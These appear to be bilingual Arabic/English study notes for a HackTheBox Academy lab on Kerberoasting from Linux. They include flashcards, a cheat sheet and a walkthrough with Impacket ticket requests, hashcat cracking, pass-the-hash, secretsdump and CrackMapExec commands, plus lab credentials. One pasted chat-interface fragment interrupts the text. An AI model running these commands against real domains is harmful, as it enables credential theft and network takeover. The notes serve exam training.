2. **فخ الـ Honey-SPNs:** بالواقع (Real Pentest)، فريق الحماية (Blue Team) يسوون حسابات وهمية يسموها "Honeytokens"، يعطوها SPN واسم جذاب مثل `SQLAdmin`، ويخلون باسورداها وهمي. إذا أنت سحبت تذكرة هذا الحساب وحاولت تكسرها أو تستخدمها، راح يدك إنذار عندهم ويكولهم "اكو مهاجم بالشبكة سحب فخ العسل!". لذلك، افحص الحسابات بالـ BloodHound قبل لا تسحب تذاكرها شوف إذا كانت نشطة فعلاً أو مجرد فخ.
    

🔗 **ربط بسكاشن/موديولات أخرى:**

استخدام حزمة Impacket راح يرافقك بكل مسار الـ CPTS. أداة `GetUserSPNs.py` هي أخت أداة `GetNPUsers.py` (التي تستخدم لهجوم AS-REPRoasting)، ونفس مفهوم التذاكر موجود بموديول `Attacking Enterprise Networks`.

🌍 **السياق الحقيقي (Real Pentest Context):**

بالاختبارات الحقيقية، إذا حصلت باسورد `sqldev` واكتشفت إنه مو `Domain Admin` (عكس ما ظهر بهذا السكشن المبسط)، هل انتهى الهجوم؟ لا. السكشن يشرحلك إن هذا يوزر يشغل خدمة `MSSQL`. معناها تكدر تفتح برنامج إدارة قواعد البيانات، تتصل بالسيرفر بالباسورد الجديد، وتفعل ميزة `xp_cmdshell`، وتنفذ أوامر (RCE) على السيرفر كـ Local System! يعني الـ Kerberoasting دائماً يفتحلك باب، سواء للسيرفر نفسه أو للشبكة كلها.

🏆 **النصيحة الذهبية للـ CPTS Exam:**

بامتحان الـ CPTS، من تلقى SPN Accounts، **لا تضيع وقتك الثمين في كسر حسابات عادية بكلمات سر معقدة جداً**. الامتحان مصمم بحيث الحساب اللي المفروض تكسره، راح ينكسر بسرعة بملف `rockyou.txt` أو بـ `Custom Wordlist` أنت جمعته من الموقع مال الشركة (عن طريق CeWL). إذا طول الكسر، راجع نفسك، ممكن دا تستهدف الحساب الغلط.

━━━━━

## 💎 الفلاشكاردز — ملخص السكشن للحفظ

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #1

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ما هو الغرض الأساسي من استخدام أداة `GetUserSPNs.py` في بيئة Linux؟

✅ Back: استكشاف حسابات الـ SPNs وطلب تذاكر الـ TGS الخاصة بها (TGS-REQ/REP) وحفظها بتنسيق جاهز للكسر من نظام لينكس غير مرتبط بالدومين.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #2

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ما هو الشرط الأساسي الذي يجب أن تملكه قبل تنفيذ هجوم Kerberoasting باستخدام Impacket؟

✅ Back: يجب أن تمتلك بيانات اعتماد صالحة (اسم مستخدم وكلمة مرور/أو NTLM Hash) لأي حساب نطاق عادي (Standard Domain User) وعنوان الـ DC.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #3

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: في مخرجات أداة `GetUserSPNs.py`، أي عمود يعتبر الأكثر أهمية لتحديد الأهداف ذات القيمة العالية (High Value Targets)؟

✅ Back: عمود `MemberOf`، لأنه يوضح المجموعات التي ينتمي إليها الحساب (مثل Domain Admins)، مما يحدد مدى خطورة وتأثير اختراقه.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #4

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ماذا تفعل راية (Flag) `-outputfile` ولماذا هي مهمة؟

✅ Back: تقوم بحفظ تذاكر الـ TGS المسحوبة في ملف نصي نظيف ومُنَسّق بدلاً من طباعتها على الشاشة، مما يمنع أخطاء التنسيق (الفراغات والأسطر) عند نقلها لبرنامج Hashcat.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #5

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ما هو رقم الوضع (`-m`) في برنامج Hashcat المخصص لكسر تذاكر Kerberos 5 TGS-REP بتشفير RC4 (التي تبدأ بـ `$krb5tgs$23$`)؟

✅ Back: الوضع هو `13100`.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #6

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: عند التحقق من الصلاحيات بأداة `CrackMapExec`، ماذا تعني الكلمة `(Pwn3d!)` بجانب النتيجة الخضراء؟

✅ Back: تعني أن الحساب المخترق يمتلك صلاحيات مسؤول محلي (Local Administrator) على السيرفر المستهدف (وإذا كان الهدف هو الـ DC، فأنت Domain Admin).

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #7

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ما هو الخطأ الشائع `Clock skew too great` الذي يظهر عند استخدام أدوات Impacket لطلب التذاكر؟

✅ Back: يظهر عندما يكون فارق الوقت بين جهاز المهاجم (Linux) وجهاز التحكم بالمجال (Domain Controller) أكثر من 5 دقائق، مما يكسر بروتوكول Kerberos.

━━━━━

## 📄 ورقة غش السكشن — للسكرين شوت

🛑 هذه ورقة غش مخصصة لسكشن (Kerberoasting - from Linux) للرجوع إليها سريعاً أثناء اللاب.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📄 ورقة غش: Kerberoasting من بيئة اللينكس (Impacket)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🎯 **هدف هذا السكشن بجملة:**

القدرة على استكشاف، وسحب، وكسر تذاكر حسابات الخدمات (SPN) من بيئة لينكس (غير مرتبطة بالدومين) باستخدام حساب مستخدم عادي وحزمة Impacket.

⚔️ **خوارزمية التطبيق (فكر هكذا باللاب خطوة بخطوة):**

1. **تزامن الوقت:** تأكد من أن وقت اللينكس يطابق الـ DC (تجنباً لخطأ Clock Skew).
    
2. **الاستطلاع:** شغل `GetUserSPNs.py` بدون `-request` لاستكشاف الأهداف.
    
3. **التقييم:** ابحث في عمود `MemberOf` عن حسابات إدارية (Admins).
    
4. **السحب:** اسحب تذاكر الحسابات المهمة فقط باستخدام `-request-user` واحفظها بـ `-outputfile`.
    
5. **الكسر:** استخدم `Hashcat` مع قاموس قوي (rockyou) لكسر الهاش.
    
6. **التحقق:** تأكد من عمل الباسورد وصلاحياته باستخدام `CrackMapExec` (NetExec).
    

📐 **جدول الأوامر الأساسية لهذا السكشن:**

|**الهدف**|**الأمر**|**ملاحظة**|
|---|---|---|
|**الاستطلاع (معرفة الأهداف)**|`GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER>`|يطلب الباسورد. يظهر جدول الحسابات وصلاحياتها.|
|**سحب كل التذاكر (لا ينصح به)**|`GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER> -request -outputfile hashes.txt`|يسحب تذاكر كل الحسابات (Noise عالي جداً).|
|**سحب تذكرة محددة (موصى به)**|`GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER> -request-user <TARGET_USER> -outputfile hashes.txt`|دقيق وصامت. استبدل `TARGET_USER` باسم الهدف (مثال sqldev).|
|**كسر الهاش (TGS-REP RC4)**|`hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt`|يحول التذكرة المشفرة إلى باسورد Cleartext.|
|**التحقق من الصلاحيات (CME)**|`crackmapexec smb <DC_IP> -u <USER> -p <PASSWORD>`|ابحث عن كلمة `(Pwn3d!)` كدليل على اختراق السيرفر.|

🔢 **قيم وثوابت مهمة:**

- **`13100`**: هوية وضع (Mode) التشفير RC4 TGS-REP بـ Hashcat.
    
- **`$krb5tgs$23$`**: بادئة الهاش الذي يمثل تشفير RC4 القديم والضعيف (الأسهل في الكسر).
    

🚨 **الفخوخ الخاصة بهذا السكشن:**

❌ **فخ 1 (مشكلة الـ DNS):** فشل السكربت بالرغم من صحة الباسورد. (الحل: أضف الـ IP واسم الدومين في ملف `/etc/hosts`).

❌ **فخ 2 (الوقت):** فشل الكيربروس بسبب الـ Clock Skew. (الحل: استخدم `sudo ntpdate <DC_IP>` أو اضبط وقت الكالي يدوياً).

❌ **فخ 3 (تضييع الوقت):** محاولة كسر باسوردات حسابات الكمبيوتر التي تنتهي بـ `$` (لن تنكسر أبداً لأنها عشوائية ومكونة من 120 حرف).

💡 **Golden Tip:**

إذا قمت بكسر حساب يملك SPN ولم يكن `Domain Admin`، تذكر أن الهجوم لم يفشل! هذا الحساب يملك صلاحية على السيرفر الخاص بالخدمة التي يشغلها (مثلاً SQL). يمكنك تسجيل الدخول إلى تلك الخدمة ومحاولة تنفيذ هجوم (RCE) على السيرفر كخطوة تالية.

━━━━━

بهيج خلصنا. هسة عندك:

✅ ليش هذا الموضوع موجود (Big Picture)

✅ كل المصطلحات الجديدة بالسكشن

✅ كيف السكشن مبني وشنو يبي يعلمك

✅ الشرح العميق لكل مفهوم بأمثلة وتشبيهات

✅ ما لم يقله HTB (الـ gotchas والثغرات بالشرح)

✅ فلاشكاردز السكشن

✅ ورقة غش مخصصة للـ lab

الآن ارجع اقرأ نص السكشن الأصلي بـ HTB — وراح تلاحظ إن كل جملة صارت واضحة وإن فاهم ليش موجودة. بالتوفيق! 💪]

```text
══════════════════════════════════════════════════════════════════
[✓] PHASE_I EXTRACTION COMPLETE
[✓] THEORETICAL FRAMEWORK LOADED INTO MEMORY
[→] TRANSITIONING TO LIVE CHALLENGE ENVIRONMENT . . .
══════════════════════════════════════════════════════════════════
```

## 🎯 PHASE_II — حقل التدريب :: السؤال وطرق الحل الستة

> [!danger] ☣️ PHASE II INITIALIZED · LIVE CHALLENGE ENVIRONMENT
> **Language:** English — **Size:** ~2,000 Words
> **Content:** Official HTB question · Lab target setup · 6 attack methods against live infrastructure.

[
# Kerberoasting from Linux: Complete Beginner's Guide

> **Context:** You are working on the HackTheBox Academy "Active Directory Enumeration & Attacks" module. You have SSH credentials to a Linux attack host, and you need to perform a Kerberoasting attack against the `SAPService` account in the `INLANEFREIGHT.LOCAL` domain, then crack the retrieved ticket.

---

## 1\. THE QUESTION & SYSTEMATIC THOUGHT PROCESS

### Re-stating the Question in Simple Terms

**Question 1:** Find the `SAPService` account's TGS ticket (a special encrypted credential token), crack it offline with a password cracker, and submit the plaintext password.

**Question 2:** Find out which powerful local group on the Domain Controller the `SAPService` account belongs to.

---

### What is Actually Happening Here? (The Beginner's Explanation)

Think of Kerberos like a **theme park ticket system**:

```
You (Domain User) → Ask the ticket booth (KDC/DC) → "I want to use the roller coaster (SAPService)"
The ticket booth gives you a TICKET (TGS) that is LOCKED with the roller coaster operator's KEY (SAPService's NTLM password hash)
You take that LOCKED ticket home and try every possible key until one opens it
When you find the right key = you now know SAPService's password!
```

**Why does this attack work?**

Any authenticated domain user can request a Kerberos Service Ticket (TGS) for ANY service account in the domain. This is by design — it's how Kerberos is supposed to work. The problem is that the ticket is encrypted using the **service account's NTLM password hash**. If that password is weak, we can crack it offline without ever triggering lockout policies.

```
ATTACK FLOW:
┌─────────────────────────────────────────────────────────────┐
│  1. SSH into attack host (Linux)                            │
│  2. Use GetUserSPNs.py to list SPN accounts                 │
│  3. Request TGS ticket for SAPService                       │
│  4. Save ticket hash to file                                │
│  5. Run Hashcat with rockyou.txt to crack it                │
│  6. Enumerate group memberships (for Question 2)            │
└─────────────────────────────────────────────────────────────┘
```

### Why GetUserSPNs.py is the Core Solution

We are on a **Linux host** that is **not domain-joined**. We only have valid domain credentials (`htb-student`). Impacket's `GetUserSPNs.py` is specifically designed for this exact scenario — it communicates with the Domain Controller over the network using those credentials and requests TGS tickets without needing to be on the domain.

---

## 2\. SIX DISTINCT SOLUTION APPROACHES

### 🔵 Approach 1 — List All SPNs First, Then Target SAPService (Beginner-Friendly)

**Step 1:** SSH into the attack host

bash

```
ssh htb-student@<ATTACK_HOST_IP>
# Password: HTB_@cademy_stdnt!
```

**Step 2:** Enumerate all SPN accounts to confirm SAPService exists

bash

```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/htb-student
```

> When prompted for a password, type: `HTB_@cademy_stdnt!`

**Expected Output:**

```
Impacket v0.9.25 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                    Name        MemberOf                                          PasswordLastSet             LastLogon
--------------------------------------  ----------  ------------------------------------------------  --------------------------  ----------
SAP/SAPServiceINLANEFREIGHT.LOCAL       SAPService  CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT  2022-02-15 17:12:00.000000  <never>
MSSQLSvc/DEV-PRE-SQL.inlanefreight...   sqldev      CN=Domain Admins,...                              2022-02-15 17:13:31.000000  <never>
```

**Pivot Trigger:** If you see `[-] CCache file is not found. Skipping...` or `KRB_AP_ERR_SKEW` (clock skew error), the DC time differs from your host by more than 5 minutes. Move to Approach 3 which handles this.

---

### 🔵 Approach 2 — Request & Save the SAPService TGS Ticket (The Main Attack)

**The exact command:**

bash

```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/htb-student \
  -request-user SAPService \
  -outputfile SAPService_tgs.txt
```

> **Breaking down the flags:**
> 
> -   `-dc-ip 172.16.5.5` → The IP address of the Domain Controller
> -   `INLANEFREIGHT.LOCAL/htb-student` → Domain\\Username
> -   `-request-user SAPService` → Only get the ticket for SAPService (targeted)
> -   `-outputfile SAPService_tgs.txt` → Save the hash to this file

**Expected Output:**

```
Impacket v0.9.25 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName              Name        MemberOf                                PasswordLastSet
--------------------------------  ----------  --------------------------------------  --------------------------
SAP/SAPServiceINLANEFREIGHT.LOCAL SAPService  CN=Account Operators,CN=Builtin,...    2022-02-15 17:12:00.000000
```

Then check the saved file:

bash

```
cat SAPService_tgs.txt
```

```
$krb5tgs$23$*SAPService$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/SAPService*$a3f...
<very long hash string>
```

**Failure Scenarios:**

Failure

Cause

`[-] Kerberos SessionError: KRB_AP_ERR_SKEW`

Clock skew > 5 minutes

`[-] Principal: SAPService - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN`

Wrong username spelling

Empty output, no ticket

Account may not have an SPN set

**Pivot Trigger:** If the `SAPService_tgs.txt` file is empty or doesn't contain `$krb5tgs$`, the ticket was not captured. Move to Approach 4.

---

### 🔵 Approach 3 — Crack the Ticket with Hashcat (Mode 13100)

> This runs on your **local machine or the Pwnbox**, not the target.

bash

```
hashcat -m 13100 SAPService_tgs.txt /usr/share/wordlists/rockyou.txt --force
```

> **Breaking down the flags:**
> 
> -   `-m 13100` → Hash mode for Kerberos TGS tickets (RC4/etype 23)
> -   `SAPService_tgs.txt` → Your input file with the hash
> -   `/usr/share/wordlists/rockyou.txt` → The wordlist
> -   `--force` → Ignore GPU warnings (needed in VMs)

**Expected Output:**

```
hashcat (v6.2.5) starting...

$krb5tgs$23$*SAPService$INLANEFREIGHT.LOCAL$...:!SapperFi3ld
                                                 ^^^^^^^^^^^^^
                                                 THIS IS THE PASSWORD

Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Recovered........: 1/1 (100.00%) Digests
```

**Failure Scenarios:**

Failure

Cause

Fix

`Status: Exhausted`

Password not in rockyou.txt

Try a larger wordlist or rules

`No hashes loaded`

File format wrong or empty

Re-run GetUserSPNs.py

Very slow / no GPU

Running in VM

Add `--force` flag

**Pivot Trigger:** If `Status: Exhausted` appears and **zero** hashes were recovered, your wordlist is insufficient. Move to Approach 5 (rules-based cracking).

---

### 🟡 Approach 4 — Use `-request` Flag (Get ALL Tickets) as a Fallback

If targeting SAPService directly failed, pull all tickets:

bash

```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/htb-student \
  -request \
  -outputfile all_tgs_tickets.txt
```

Then grep for the SAPService hash:

bash

```
grep -A 2 "SAPService" all_tgs_tickets.txt
```

**Expected Output:**

```
$krb5tgs$23$*SAPService$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/SAPService*$...
[long hash continues]
```

**Failure Scenarios:**

-   If there are **many** SPN accounts, the file might be large and harder to parse.
-   Some tickets may fail to be issued if the account has restricted delegation settings.

**Pivot Trigger:** If the file c

complet from 🟡 Approach 5 — Cracking with Rules (When rockyou.txt Fails)  
If standard dictionary attack fails, add \*\*

![Favicon for anthropic](/images/icons/Anthropic.svg)

Claude Sonnet 4.6

### 🟡 Approach 5 — Cracking with Rules (When rockyou.txt Fails)

If standard dictionary attack fails, add **mutation rules** to transform wordlist entries into more complex password variants:

bash

```
hashcat -m 13100 SAPService_tgs.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  --force
```

> **What are rules?** Rules tell Hashcat to automatically mutate each word in the wordlist. For example:
> 
> -   `password` → `Password`, `PASSWORD`, `p@ssword`, `password1`, `Password123!`
> -   This multiplies your attack surface without needing a larger wordlist.

**You can stack multiple rule files for even more coverage:**

bash

```
hashcat -m 13100 SAPService_tgs.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  -r /usr/share/hashcat/rules/toggles1.rule \
  --force
```

**Common rule files available on Kali/Pwnbox:**

Rule File

Purpose

`best64.rule`

64 most effective mutations

`toggles1.rule`

Uppercase/lowercase toggles

`dive.rule`

Very aggressive, millions of mutations

`d3ad0ne.rule`

Popular community rule set

`rockyou-30000.rule`

Derived from rockyou analysis

**Expected Output (success with rules):**

```
$krb5tgs$23$*SAPService$INLANEFREIGHT.LOCAL$...:!SapperFi3ld

Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Recovered........: 1/1 (100.00%) Digests
Time.Started.....: Wed Jul 29 10:22:15 2026 (45 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule)
Speed.#1.........:   430.1 kH/s (14.22ms)
```

**Failure Scenarios:**

Failure

Cause

Fix

`ERROR: No rule files found`

Wrong path to rule files

Run `find / -name "best64.rule" 2>/dev/null` to locate them

Still `Exhausted` after rules

Password is truly complex or custom

Use a custom wordlist like `SecLists` or `CeWL`

Extremely slow speed

No GPU available in VM

Acceptable — just takes longer, keep `--force`

**Pivot Trigger:** If after running `best64.rule` and `dive.rule` you still get `Exhausted`, the password is not derivable from rockyou. Move to Approach 6 (custom wordlist + CeWL or SecLists).

---

### 🔴 Approach 6 — Enumerate Group Membership to Answer Question 2

Once you have the password (or even before cracking), you need to answer **Question 2**: _"What powerful local group on the Domain Controller is SAPService a member of?"_

There are two clean ways to do this from Linux:

#### Method A — Using GetUserSPNs.py Output (Already Visible!)

Look carefully at the output from **Approach 1**. The `MemberOf` column already tells you the group:

bash

```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/htb-student
```

```
ServicePrincipalName                    Name        MemberOf
--------------------------------------  ----------  -------------------------------------------
SAP/SAPServiceINLANEFREIGHT.LOCAL       SAPService  CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL
```

> 🔍 Read the `MemberOf` column carefully — the `CN=` value before `,CN=Builtin` is the **group name**.

---

#### Method B — Using `ldapdomaindump` for Full LDAP Enumeration

bash

```
ldapdomaindump -u 'INLANEFREIGHT.LOCAL\htb-student' \
  -p 'HTB_@cademy_stdnt!' \
  172.16.5.5 \
  -o /tmp/ldap_dump
```

Then examine the user details:

bash

```
cat /tmp/ldap_dump/domain_users.json | python3 -m json.tool | grep -A 20 "SAPService"
```

---

#### Method C — Using `crackmapexec` with LDAP Protocol

bash

```
crackmapexec ldap 172.16.5.5 \
  -u htb-student \
  -p 'HTB_@cademy_stdnt!' \
  --query "(sAMAccountName=SAPService)" \
  "memberOf"
```

**Expected Output (all methods point to same answer):**

```
CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL
```

> 💡 **Why is "Account Operators" dangerous?**  
> The **Account Operators** group is a powerful built-in Windows group. Members can:
> 
> -   Create, modify, and delete user accounts
> -   Add users to most groups (except Domain Admins and a few others)
> -   Log on to Domain Controllers locally
> 
> This makes `SAPService` **extremely dangerous** if compromised — an attacker could create new admin accounts or modify existing privileged accounts.

**Failure Scenarios:**

Failure

Cause

Fix

`ldapdomaindump` not found

Tool not installed

`pip3 install ldapdomaindump`

`Connection refused on port 389`

LDAP port blocked

Try port 636 (LDAPS) with `--no-check-certificate`

Empty `MemberOf` field

Account has no group memberships shown

Query the DC directly with `net rpc` commands

**Pivot Trigger:** If all LDAP queries return empty membership data, fall back to the `GetUserSPNs.py` output `MemberOf` column which is the most reliable source for this lab.

---

## COMPLETE WALKTHROUGH — Putting It All Together

Here is the **exact sequential workflow** from start to finish:

bash

```
# ============================================================
# STEP 1: SSH into the attack host
# ============================================================
ssh htb-student@<ATTACK_HOST_IP>
# Enter password: HTB_@cademy_stdnt!

# ============================================================
# STEP 2: Verify Impacket is installed
# ============================================================
GetUserSPNs.py --help
# You should see the help menu — if not, run:
# sudo pip3 install impacket

# ============================================================
# STEP 3: List all SPN accounts & confirm SAPService exists
# ============================================================
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/htb-student
# Password: HTB_@cademy_stdnt!
# READ the MemberOf column for SAPService → answers Question 2

# ============================================================
# STEP 4: Request & save TGS ticket for SAPService
# ============================================================
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/htb-student \
  -request-user SAPService \
  -outputfile SAPService_tgs.txt
# Password: HTB_@cademy_stdnt!

# ============================================================
# STEP 5: Verify the hash was captured
# ============================================================
cat SAPService_tgs.txt
# You should see a long string starting with $krb5tgs$23$*SAPService$...

# ============================================================
# STEP 6: Crack the ticket with Hashcat
# ============================================================
hashcat -m 13100 SAPService_tgs.txt /usr/share/wordlists/rockyou.txt --force
# Wait for Status: Cracked
# The password appears after the hash: $krb5tgs$23$*...*:THE_PASSWORD_IS_HERE

# ============================================================
# STEP 7: (If rockyou fails) Try with rules
# ============================================================
hashcat -m 13100 SAPService_tgs.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule --force

# ============================================================
# STEP 8: Verify the cracked credentials work
# ============================================================
crackmapexec smb 172.16.5.5 -u SAPService -p '<CRACKED_PASSWORD>'
# Look for [+] and (Pwn3d!) in the output
```

---

## 3\. THE "WHAT IF" MASTERCLASS (6 Scenarios for CPTS Preparation)

---

### 🔴 What If Scenario 1: GetUserSPNs.py Returns a Clock Skew Error?

**The Error You'll See:**

```
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

**Why This Happens:**

Kerberos authentication requires that the clocks of the client and the Domain Controller are **within 5 minutes of each other**. This is a security feature to prevent replay attacks. If your Pwnbox or attack host clock drifts, Kerberos will completely refuse to work.

**The Fix — Synchronize Your Clock with the DC:**

bash

```
# Step 1: Check current time difference
date
# Then check DC time via:
crackmapexec smb 172.16.5.5 -u htb-student -p 'HTB_@cademy_stdnt!'
# Look for the timestamp in the output

# Step 2: Install ntpdate if not present
sudo apt-get install ntpdate -y

# Step 3: Sync your clock TO the Domain Controller's clock
sudo ntpdate 172.16.5.5

# Step 4: Verify sync worked
date

# Step 5: Re-run your GetUserSPNs.py command
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/htb-student \
  -request-user SAPService -outputfile SAPService_tgs.txt
```

**Alternative Fix (manual time set):**

bash

```
# If ntpdate doesn't work, set time manually
sudo timedatectl set-ntp false
sudo timedatectl set-time "2026-07-29 14:35:00"
# Adjust the time to match what the DC shows
```

> 💡 **CPTS Exam Tip:** Clock skew issues are extremely common in real engagements. Always sync your clock to the DC before attempting ANY Kerberos-based attack.

---

### 🔴 What If Scenario 2: The rockyou.txt Wordlist Doesn't Crack the Hash?

**The Problem:**

```
Status...........: Exhausted
Recovered........: 0/1 (0.00%) Digests
```

This means the password is not in `rockyou.txt` in its raw form.

**Layered Cracking Strategy — Try Each Step Before Moving to the Next:**

bash

```
# LAYER 1: Try common rules on rockyou
hashcat -m 13100 SAPService_tgs.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule --force

# LAYER 2: Try the dive rule (very comprehensive)
hashcat -m 13100 SAPService_tgs.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/dive.rule --force

# LAYER 3: Try SecLists passwords (much larger than rockyou)
# Download if not present:
git clone https://github.com/danielmiessler/SecLists /opt/SecLists

hashcat -m 13100 SAPService_tgs.txt \
  /opt/SecLists/Passwords/Leaked-Databases/rockyou-75.txt --force

# LAYER 4: Try combination attack (combine two wordlists)
hashcat -m 13100 SAPService_tgs.txt \
  -a 1 \
  /usr/share/wordlists/rockyou.txt \
  /opt/SecLists/Passwords/Common-Credentials/common-passwords-win.txt \
  --force

# LAYER 5: Use CeWL to generate a target-specific wordlist
# (spider the company's website for custom words)
cewl https://inlanefreight.com -d 3 -m 5 -o inlanefreight_wordlist.txt

hashcat -m 13100 SAPService_tgs.txt inlanefreight_wordlist.txt \
  -r /usr/share/hashcat/rules/best64.rule --force
```

> 💡 **CPTS Exam Tip:** In CTF/exam environments, passwords are almost always crackable with `rockyou.txt` or `rockyou.txt + best64.rule`. If neither works, double-check that your hash file is valid and not truncated.

---

### 🔴 What If Scenario 3: You Only Have an NTLM Hash (No Cleartext Password) for htb-student?

**The Scenario:**

You compromised a host and found the NTLM hash for `htb-student` in a SAM dump or memory, but never obtained the cleartext password.

**The Solution — Pass-the-Hash with GetUserSPNs.py:**

Impacket tools natively support NTLM hash authentication using the `-hashes` flag in `LM:NT` format. If you only have the NT hash, use `aad3b435b51404eeaad3b435b51404ee` as a placeholder for the LM hash (this is the LM hash of an empty string, universally used as a placeholder).

bash

```
# Format: -hashes LMhash:NThash
# If you only have NT hash, use the empty LM hash placeholder

GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/htb-student \
  -hashes aad3b435b51404eeaad3b435b51404ee:<NT_HASH_HERE> \
  -request-user SAPService \
  -outputfile SAPService_tgs.txt

# Example with a fake hash:
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/htb-student \
  -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 \
  -request-user SAPService \
  -outputfile SAPService_tgs.txt
```

**How to get the NTLM hash in the first place:**

bash

```
# From a compromised Windows host (if you have SYSTEM):
secretsdump.py -just-dc-user htb-student INLANEFREIGHT.LOCAL/Administrator@172.16.5.5

# From a Linux host with a keytab file:
secretsdump.py -k -no-pass INLANEFREIGHT.LOCAL/htb-student@172.16.5.5
```

> 💡 **CPTS Exam Tip:** Pass-the-Hash is one of the most important techniques in Active Directory attacks. Always try it when you have an NTLM hash but no password — it works with most Impacket tools.

---

### 🔴 What If Scenario 4: The Domain Controller IP is Unknown?

**The Scenario:**

You SSH into the attack host but don't know the DC's IP address (172.16.5.5 was given to you in this lab, but in real engagements you must find it yourself).

**Multiple Ways to Find the Domain Controller IP:**

bash

```
# METHOD 1: DNS lookup (most reliable)
# Query for the domain's Kerberos SRV record
nslookup -type=SRV _kerberos._tcp.INLANEFREIGHT.LOCAL 172.16.5.5

# METHOD 2: nmcli or ifconfig to check your own network config
# Often the DC is your DNS server
cat /etc/resolv.conf
# Look for "nameserver X.X.X.X" — that's often the DC

# METHOD 3: Use nmap to find Windows hosts with port 88 (Kerberos)
# Port 88 is ONLY open on Domain Controllers
sudo nmap -p 88 172.16.5.0/24 --open -oG - | grep "88/open"

# Expected output:
# Host: 172.16.5.5 ()   Ports: 88/open/tcp////

# METHOD 4: Use crackmapexec to identify DCs
crackmapexec smb 172.16.5.0/24 --gen-relay-list /tmp/hosts.txt
# Look for "(domain:INLANEFREIGHT.LOCAL)" and check which one says DC

# METHOD 5: If you have any Windows host access
# Run this from a Windows shell:
# nltest /dclist:INLANEFREIGHT.LOCAL
# OR
# nslookup INLANEFREIGHT.LOCAL
```

> 💡 **Key Ports that identify a Domain Controller:**

Port

Service

Significance

88

Kerberos

**Unique to DCs**

389

LDAP

Runs on DCs

636

LDAPS

Secure LDAP

445

SMB

Common but not unique

3268

Global Catalog

Only on DCs

---

### 🔴 What If Scenario 5: You Need to Enumerate Group Membership Without GetUserSPNs.py Output?

**The Scenario:**

The `MemberOf` column in `GetUserSPNs.py` is empty or truncated, and you need to definitively answer Question 2 about what group SAPService belongs to.

**Multiple Enumeration Methods:**

bash

```
# METHOD 1: rpcclient (built into Linux, no extra tools needed)
rpcclient -U "htb-student%HTB_@cademy_stdnt!" 172.16.5.5

# Inside rpcclient shell:
rpcclient $> queryuser SAPService
# Look for "Group Memberships" section

rpcclient $> exit

# METHOD 2: ldapsearch (raw LDAP query)
ldapsearch -x -H ldap://172.16.5.5 \
  -D "htb-student@INLANEFREIGHT.LOCAL" \
  -w 'HTB_@cademy_stdnt!' \
  -b "DC=INLANEFREIGHT,DC=LOCAL" \
  "(sAMAccountName=SAPService)" \
  memberOf

# Expected Output:
# dn: CN=SAPService,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
# memberOf: CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL

# METHOD 3: bloodhound-python (visual graph of all relationships)
bloodhound-python -u htb-student \
  -p 'HTB_@cademy_stdnt!' \
  -d INLANEFREIGHT.LOCAL \
  -ns 172.16.5.5 \
  -c All

# This generates JSON files you can import into BloodHound GUI
